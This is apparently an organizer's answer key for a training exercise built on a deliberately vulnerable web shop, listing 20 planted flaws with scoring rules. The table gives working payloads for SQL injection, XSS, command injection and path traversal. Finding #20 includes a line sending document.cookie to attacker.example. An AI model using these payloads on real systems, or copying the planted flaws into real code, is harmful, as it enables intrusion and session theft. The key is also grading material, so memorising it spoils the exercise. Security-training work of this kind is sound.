# SOLUTIONS.md — Organizer Answer Key (do not distribute to participants)

Suggested scoring: 5 pts basic finding, +3 bonus for a working PoC payload,
+2 bonus for correctly naming the OWASP Top 10 category. 16 findings × 5 = 80
base points, adjust as needed.

| # | Vulnerability | Location | How to trigger it | OWASP Top 10 (2021) |
|---|---|---|---|---|
| 1 | SQL Injection (auth bypass) | `POST /login` | Username: `' OR '1'='1' -- ` , any password | A03: Injection |
| 2 | SQL Injection (UNION, data exfiltration) | `GET /search?q=` | `q=%' UNION SELECT username,password,role FROM users -- ` | A03: Injection |
| 3 | Reflected XSS | `GET /search?q=` | `q=<script>alert(document.cookie)</script>` | A03: Injection (XSS) |
| 4 | Stored XSS | `POST /guestbook` (message field) | Post `<img src=x onerror=alert(1)>` as a message | A03: Injection (XSS) |
| 5 | Insecure Direct Object Reference (IDOR) | `GET /profile?user_id=` | Log in as any user, change `user_id` to another user's ID (1, 2, 3…) to view their email/card/orders | A01: Broken Access Control |
| 6 | Broken access control via client-editable cookie | `GET /admin`, `role` cookie | Log in as any user, edit the `role` cookie value to `admin` in devtools | A01: Broken Access Control |
| 7 | OS Command Injection | `POST /tools` (host field) | `host=127.0.0.1 && cat /etc/passwd` (or `; whoami`) | A03: Injection |
| 8 | Path Traversal / Arbitrary File Read | `GET /download?file=` | `file=../../../../etc/passwd` or `file=../app.py` to read source | A01: Broken Access Control (path traversal) |
| 9 | **Unrestricted File Upload** (accepts every file type — no extension/MIME allow-list, no `accept` filter on the input) | `POST /profile/picture` (profile page "Update picture") | Upload an `.html` file containing `<script>` as your profile picture — it's saved as-is under `/static/uploads/` and executes when the URL is visited directly | A04: Insecure Design / A01 |
| 10 | Sensitive data exposure — backup file | `GET /static/backup.sql.bak` | Direct request (hinted at by `robots.txt`) reveals the admin's plaintext password | A05: Security Misconfiguration |
| 11 | Sensitive data exposure — leaked config | `GET /static/config.py.bak` | Direct request reveals the app's secret key and fake cloud credentials | A05: Security Misconfiguration |
| 12 | Plaintext password storage | `users` table (visible via #2, #10, or the admin panel) | Passwords are never hashed | A02: Cryptographic Failures |
| 13 | Weak/hardcoded session secret | `app.secret_key = "bytemart123"` (source only reachable via #8) | A short, guessable Flask secret key means session cookies could be forged offline | A02: Cryptographic Failures |
| 14 | CSRF on state-changing action | `POST /update_email` | No CSRF token; a third-party page can auto-submit a form to this URL while the victim is logged in and change their email | A01: Broken Access Control (CSRF) |
| 15 | Open Redirect | `GET /redirect?url=` | `url=https://evil.example` redirects the browser off-site — useful for phishing | A01: Broken Access Control |
| 16 | Verbose error messages / information leakage | Any malformed SQLi payload that breaks the query, e.g. `q=foo'` | Returns the raw SQL query and driver error to the browser | A05: Security Misconfiguration |
| 17 | Debug mode enabled | Any unhandled server exception | `app.run(debug=True)` — Werkzeug's interactive debugger/stack traces are reachable | A05: Security Misconfiguration |
| 18 | Missing security headers / clickjacking | Any page (inspect response headers) | No `X-Frame-Options` / `Content-Security-Policy` — site can be framed | A05: Security Misconfiguration |
| 19 | No rate limiting / brute-force protection | `POST /login` | Unlimited login attempts allowed, no lockout or delay | A07: Identification & Authentication Failures |
| 20 | **Session Hijacking via cookie theft** | Any page (session cookie), combined with #3 or #4 (XSS) | Session cookie has `HttpOnly` disabled on purpose, so a stored-XSS payload in the guestbook (e.g. `<script>fetch('https://attacker.example/c?'+document.cookie)</script>` or simply `<script>document.title=document.cookie</script>` to read it visibly) can read `document.cookie` and exfiltrate the victim's session id. Pasting that stolen cookie into your own browser's dev tools (Application → Cookies) logs you in as the victim with no password needed. | A07: Identification & Authentication Failures |

## Notes for grading write-ups

Accept a finding if the participant correctly identifies **the vulnerable
endpoint/parameter** and **the class of vulnerability**, even if their exact
payload differs from the examples above. Award the PoC bonus only if their
payload actually reproduces the effect (auth bypass, alert box, file
contents, injected shell output, etc.).

## Rebuilding / resetting

Vulnerabilities are all in `app.py` and the `templates/` folder — search for
the `# --- VULNERABLE:` comments to find every intentional flaw in the
source, useful if you want to add more or swap difficulty.
